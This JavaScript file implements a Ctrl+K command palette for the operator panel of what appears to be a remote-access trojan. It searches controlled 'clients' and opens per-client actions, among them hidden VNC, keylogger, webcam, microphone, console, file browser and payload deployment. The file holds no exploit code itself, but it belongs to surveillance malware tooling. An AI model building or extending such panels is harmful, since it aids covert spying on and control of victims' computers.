import { NAV_GROUPS } from "./nav/template.js";
import { CAPTURE_FLAG } from "./keyboard-capture.js";
import { osBadge } from "./viewUtils.js";

const ALL_PER_CLIENT_ACTIONS = [
  { key: "console",    feature: "console",        label: "Console",        icon: "fa-terminal",     color: "text-emerald-400", href: (id) => `/${id}/console` },
  { key: "hvnc",       feature: "hvnc",           label: "HVNC",           icon: "fa-desktop",      color: "text-fuchsia-400", href: (id) => `/hvnc?clientId=${id}` },
  { key: "rdp",        feature: "remote_desktop", label: "Remote Desktop", icon: "fa-display",      color: "text-sky-400",     href: (id) => `/remotedesktop?clientId=${id}` },
  { key: "files",      feature: "file_browser",   label: "File Browser",   icon: "fa-folder-open",  color: "text-cyan-400",    href: (id) => `/${id}/files` },
  { key: "processes",  feature: "processes",      label: "Processes",      icon: "fa-microchip",    color: "text-orange-400",  href: (id) => `/${id}/processes` },
  { key: "keylogger",  feature: "keylogger",      label: "Keylogger",      icon: "fa-keyboard",     color: "text-yellow-400",  href: (id) => `/${id}/keylogger` },
  { key: "webcam",     feature: "webcam",         label: "Webcam",         icon: "fa-camera",       color: "text-pink-400",    href: (id) => `/webcam?clientId=${id}` },
  { key: "voice",      feature: "voice",          label: "Voice",          icon: "fa-microphone",   color: "text-indigo-400",  href: (id) => `/voice?clientId=${id}` },
  { key: "deploy",     feature: null,             label: "Deploy",         icon: "fa-rocket",       color: "text-rose-400",    href: (id) => `/deploy?clientId=${id}` },
  { key: "winre",      feature: null,             label: "WinRE",          icon: "fa-shield-halved",color: "text-amber-400",   href: (id) => `/winre?clientId=${id}`, windowsOnly: true },
];

let featurePermsCache = null;

async function loadFeaturePerms() {
  if (featurePermsCache) return featurePermsCache;
  try {
    const res = await fetch("/api/auth/me", { credentials: "include" });
    if (!res.ok) return null;
    const data = await res.json();
    featurePermsCache = data?.featurePermissions || null;
    return featurePermsCache;
  } catch {
    return null;
  }
}

function clientSupportsAction(client, action) {
  if (!action.windowsOnly) return true;
  const isWindows = (client?.os || "").toLowerCase().includes("windows");
  if (!isWindows) return false;
  return true;
}

function PER_CLIENT_ACTIONS(client) {
  const perms = featurePermsCache;
  return ALL_PER_CLIENT_ACTIONS.filter((a) => {
    if (a.windowsOnly && client && !clientSupportsAction(client, a)) return false;
    if (a.feature && perms && perms[a.feature] === false) return false;
    return true;
  });
}

const RECENT_KEY = "cmdp_recent_v1";
const RECENT_MAX = 8;

let clientsCache = { items: [], ts: 0 };

async function getClients(maxAgeMs = 15000) {
  if (Date.now() - clientsCache.ts < maxAgeMs && clientsCache.items.length) return clientsCache.items;
  try {
    const res = await fetch("/api/clients?pageSize=10000", { credentials: "include" });
    if (!res.ok) return clientsCache.items;
    const data = await res.json();
    clientsCache = { items: Array.isArray(data.items) ? data.items : [], ts: Date.now() };
    return clientsCache.items;
  } catch {
    return clientsCache.items;
  }
}

function score(query, text) {
  if (!query) return 1;
  const q = query.toLowerCase();
  const t = (text || "").toLowerCase();
  if (!t) return 0;
  const idx = t.indexOf(q);
  if (idx === 0) return 2000;
  if (idx > 0) return 1000 - idx;
  let qi = 0, ti = 0, run = 0, best = 0, s = 0;
  while (qi < q.length && ti < t.length) {
    if (q[qi] === t[ti]) {
      run++;
      best = Math.max(best, run);
      s += 1 + run * 2;
      qi++;
    } else {
      run = 0;
    }
    ti++;
  }
  return qi === q.length ? s + best * 3 : 0;
}

function rankBest(query, fields) {
  let best = 0;
  for (const f of fields) {
    const sc = score(query, f);
    if (sc > best) best = sc;
  }
  return best;
}

function pagesFromNav() {
  const out = [];
  for (const g of NAV_GROUPS) {
    if (g.hidden) continue;
    if (g.href) out.push({ kind: "page", label: g.label, href: g.href, icon: g.icon, color: g.iconColor });
    if (g.children) {
      for (const c of g.children) {
        if (c.hidden) continue;
        out.push({ kind: "page", label: c.label, href: c.href, icon: c.icon, color: c.iconColor });
      }
    }
  }
  return out;
}

function loadRecent() {
  try { return JSON.parse(localStorage.getItem(RECENT_KEY) || "[]"); } catch { return []; }
}

function pushRecent(href) {
  const list = loadRecent().filter((h) => h !== href);
  list.unshift(href);
  localStorage.setItem(RECENT_KEY, JSON.stringify(list.slice(0, RECENT_MAX)));
}

function flagFor(country) {
  if (!country || country.length !== 2) return "";
  return `<span class="fi fi-${country.toLowerCase()}" style="margin-right:6px;border-radius:2px;"></span>`;
}

function clientLabel(c) {
  const name = c.nickname || c.host || c.id;
  const suffix = c.host && c.host !== name ? ` · ${c.host}` : "";
  return `${name}${suffix}`;
}

function buildResults(query, pages, clients) {
  const results = [];

  for (const p of pages) {
    const sc = score(query, p.label);
    if (sc > 0 || !query) results.push({ ...p, _score: sc + 50 });
  }

  for (const c of clients) {
    const fields = [c.nickname, c.host, c.id, c.os, c.country, c.tag, c.group].filter(Boolean);
    const sc = rankBest(query, fields);
    if (sc > 0 || !query) {
      results.push({
        kind: "client",
        client: c,
        label: clientLabel(c),
        _score: sc + (c.online ? 30 : 0),
      });
    }
  }

  for (const a of PER_CLIENT_ACTIONS(null)) {
    const sc = score(query, a.label);
    if (sc > 0) results.push({ kind: "action", action: a, _score: sc });
  }

  results.sort((a, b) => b._score - a._score);
  return results.slice(0, 60);
}

function makeIcon(faClass, colorClass) {
  return `<i class="fa-solid ${faClass} ${colorClass || "text-slate-300"}" style="width:18px;text-align:center;"></i>`;
}

function renderRow(r, active) {
  const activeCls = active ? "cmdp-row cmdp-row-active" : "cmdp-row";
  if (r.kind === "page") {
    return `<div class="${activeCls}" data-href="${r.href}">
      ${makeIcon(r.icon, r.color)}
      <span class="cmdp-label">${r.label}</span>
      <span class="cmdp-kind">page</span>
    </div>`;
  }
  if (r.kind === "client") {
    const c = r.client;
    const dot = c.online ? "background:#10b981" : "background:#475569";
    const os = osBadge(c.os || "");
    return `<div class="${activeCls}" data-client="${c.id}">
      <i class="fa ${os.icon} cv-tone-${os.tone}" style="width:18px;text-align:center;"></i>
      <span class="cmdp-status-dot" style="${dot}"></span>
      ${flagFor(c.country)}
      <span class="cmdp-label">${r.label}</span>
      <span class="cmdp-kind">${c.online ? "online" : "offline"}</span>
    </div>`;
  }
  if (r.kind === "action") {
    return `<div class="${activeCls}" data-action="${r.action.key}">
      ${makeIcon(r.action.icon, r.action.color)}
      <span class="cmdp-label">${r.action.label}</span>
      <span class="cmdp-kind">needs client</span>
    </div>`;
  }
  if (r.kind === "client-action") {
    const c = r.client;
    return `<div class="${activeCls}" data-href="${r.action.href(c.id)}">
      ${makeIcon(r.action.icon, r.action.color)}
      <span class="cmdp-label">${r.action.label} · ${clientLabel(c)}</span>
      <span class="cmdp-kind">action</span>
    </div>`;
  }
  return "";
}

function injectStyles() {
  if (document.getElementById("cmdp-styles")) return;
  const css = `
    .cmdp-backdrop { position: fixed; inset: 0; background: rgba(2,6,23,0.7); backdrop-filter: blur(4px); z-index: 9999; display: flex; align-items: flex-start; justify-content: center; padding-top: 12vh; }
    .cmdp-panel { width: min(640px, 92vw); background: #0b1220; border: 1px solid #1e293b; border-radius: 12px; box-shadow: 0 30px 60px -10px rgba(0,0,0,0.6); overflow: hidden; display: flex; flex-direction: column; max-height: 70vh; }
    .cmdp-input-wrap { display: flex; align-items: center; gap: 10px; padding: 12px 14px; border-bottom: 1px solid #1e293b; }
    .cmdp-input { flex: 1; background: transparent; border: 0; outline: 0; color: #e2e8f0; font-size: 15px; font-family: inherit; }
    .cmdp-input::placeholder { color: #64748b; }
    .cmdp-list { overflow-y: auto; padding: 6px; }
    .cmdp-row { display: flex; align-items: center; gap: 10px; padding: 9px 10px; border-radius: 8px; cursor: pointer; color: #cbd5e1; font-size: 14px; }
    .cmdp-row-active { background: #1e293b; color: #f1f5f9; }
    .cmdp-row:hover { background: #172033; }
    .cmdp-label { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
    .cmdp-kind { font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: 0.04em; }
    .cmdp-status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
    .cmdp-footer { padding: 8px 14px; border-top: 1px solid #1e293b; color: #64748b; font-size: 11px; display: flex; gap: 16px; justify-content: space-between; }
    .cmdp-kbd { display: inline-block; padding: 1px 6px; border: 1px solid #334155; border-radius: 4px; background: #0f172a; color: #94a3b8; font-family: inherit; font-size: 10px; margin: 0 2px; }
    .cmdp-empty { padding: 24px; text-align: center; color: #64748b; font-size: 13px; }
    .cmdp-section { padding: 6px 12px 2px; font-size: 10px; color: #475569; text-transform: uppercase; letter-spacing: 0.08em; }
  `;
  const style = document.createElement("style");
  style.id = "cmdp-styles";
  style.textContent = css;
  document.head.appendChild(style);
}

function mountPalette() {
  if (document.getElementById("cmdp-root")) return null;
  injectStyles();
  const root = document.createElement("div");
  root.id = "cmdp-root";
  root.className = "cmdp-backdrop";
  root.innerHTML = `
    <div class="cmdp-panel" role="dialog" aria-label="Command palette">
      <div class="cmdp-input-wrap">
        <i class="fa-solid fa-magnifying-glass text-slate-500"></i>
        <input id="cmdp-input" class="cmdp-input" type="text" autocomplete="off" spellcheck="false" placeholder="Search pages, clients, actions…" />
        <span class="cmdp-kbd">Esc</span>
      </div>
      <div id="cmdp-list" class="cmdp-list"></div>
      <div class="cmdp-footer">
        <span><span class="cmdp-kbd">↑</span><span class="cmdp-kbd">↓</span> navigate · <span class="cmdp-kbd">↵</span> select · <span class="cmdp-kbd">Shift+↵</span> new tab</span>
        <span><span class="cmdp-kbd">Ctrl</span>+<span class="cmdp-kbd">K</span></span>
      </div>
    </div>
  `;
  document.body.appendChild(root);
  return root;
}

let state = {
  open: false,
  query: "",
  active: 0,
  results: [],
  mode: "main",
  pendingAction: null,
  pendingClient: null,
};

function close() {
  state.open = false;
  state.pendingClient = null;
  state.pendingAction = null;
  state.mode = "main";
  document.removeEventListener("keydown", onKeydown, true);
  const root = document.getElementById("cmdp-root");
  if (root) root.remove();
}

function navigate(href, newTab = false) {
  pushRecent(href);
  if (newTab) window.open(href, "_blank", "noopener");
  else if (window.overlordSoftNavigate) window.overlordSoftNavigate(href);
  else window.location.href = href;
  close();
}

async function rebuild() {
  const pages = pagesFromNav();
  const clients = await getClients();
  if (state.mode === "client-actions" && state.pendingAction) {
    const action = state.pendingAction;
    const matched = clients
      .map((c) => ({ c, sc: rankBest(state.query, [c.nickname, c.host, c.id, c.os, c.country].filter(Boolean)) + (c.online ? 30 : 0) }))
      .filter(({ c }) => clientSupportsAction(c, action))
      .filter((x) => x.sc > 0 || !state.query)
      .sort((a, b) => b.sc - a.sc)
      .slice(0, 60)
      .map(({ c }) => ({ kind: "client-action", client: c, action, _score: 0 }));
    state.results = matched;
  } else {
    state.results = buildResults(state.query, pages, clients);
    if (!state.query) {
      const recent = loadRecent();
      const recentPages = recent
        .map((h) => pages.find((p) => p.href === h))
        .filter(Boolean)
        .map((p) => ({ ...p, _score: 9999 }));
      if (recentPages.length) state.results = [...recentPages, ...state.results.filter((r) => r.kind !== "page" || !recent.includes(r.href))];
    }
  }
  state.active = 0;
  renderList();
}

function renderList() {
  const list = document.getElementById("cmdp-list");
  if (!list) return;
  if (!state.results.length) {
    list.innerHTML = `<div class="cmdp-empty">No matches</div>`;
    return;
  }
  let html = "";
  if (state.mode === "client-actions" && state.pendingAction) {
    html += `<div class="cmdp-section">Pick a client for: ${state.pendingAction.label}</div>`;
  }
  html += state.results.map((r, i) => renderRow(r, i === state.active)).join("");
  list.innerHTML = html;
  const active = list.querySelector(".cmdp-row-active");
  if (active) active.scrollIntoView({ block: "nearest" });
  list.querySelectorAll(".cmdp-row").forEach((el, i) => {
    el.addEventListener("mouseenter", () => { state.active = i; renderList(); });
    el.addEventListener("click", () => activate(i, false));
  });
}

function activate(idx, newTab) {
  const r = state.results[idx];
  if (!r) return;
  if (r.kind === "page" || r.kind === "client-action") {
    navigate(r.kind === "page" ? r.href : r.action.href(r.client.id), newTab);
    return;
  }
  if (r.kind === "client") {
    state.mode = "actions-for-client";
    state.pendingClient = r.client;
    state.results = PER_CLIENT_ACTIONS(r.client).map((a) => ({ kind: "client-action", client: r.client, action: a, _score: 0 }));
    state.active = 0;
    const input = document.getElementById("cmdp-input");
    if (input) { input.value = ""; input.placeholder = `Action on ${clientLabel(r.client)}…`; input.focus(); }
    state.query = "";
    renderList();
    return;
  }
  if (r.kind === "action") {
    state.mode = "client-actions";
    state.pendingAction = r.action;
    const input = document.getElementById("cmdp-input");
    if (input) { input.value = ""; input.placeholder = `Pick a client for ${r.action.label}…`; input.focus(); }
    state.query = "";
    rebuild();
    return;
  }
}

async function open() {
  if (state.open) return;
  state.open = true;
  state.query = "";
  state.mode = "main";
  state.pendingAction = null;
  await loadFeaturePerms();
  const root = mountPalette();
  if (!root) return;
  const input = document.getElementById("cmdp-input");
  input.focus();
  await rebuild();

  root.addEventListener("click", (e) => { if (e.target === root) close(); });

  input.addEventListener("input", () => {
    state.query = input.value;
    if (state.mode === "actions-for-client" && state.pendingClient) {
      const q = state.query.toLowerCase();
      const c = state.pendingClient;
      state.results = PER_CLIENT_ACTIONS(c)
        .map((a) => ({ a, sc: score(q, a.label) }))
        .filter((x) => x.sc > 0 || !q)
        .sort((a, b) => b.sc - a.sc)
        .map(({ a }) => ({ kind: "client-action", client: c, action: a, _score: 0 }));
      state.active = 0;
      renderList();
    } else {
      rebuild();
    }
  });

  document.addEventListener("keydown", onKeydown, true);
}

function onKeydown(e) {
  if (!state.open) return;
  if (e.key === "Escape") { e.preventDefault(); close(); return; }
  if (e.key === "ArrowDown") { e.preventDefault(); state.active = Math.min(state.results.length - 1, state.active + 1); renderList(); return; }
  if (e.key === "ArrowUp")   { e.preventDefault(); state.active = Math.max(0, state.active - 1); renderList(); return; }
  if (e.key === "Enter") {
    e.preventDefault();
    activate(state.active, e.shiftKey);
    return;
  }
}

let inited = false;
export function init() {
  if (inited) return;
  inited = true;
  document.addEventListener("keydown", (e) => {
    if (window[CAPTURE_FLAG]) return;
    const k = e.key.toLowerCase();
    if ((e.ctrlKey || e.metaKey) && k === "k") {
      e.preventDefault();
      if (state.open) close();
      else open();
    }
  });
}
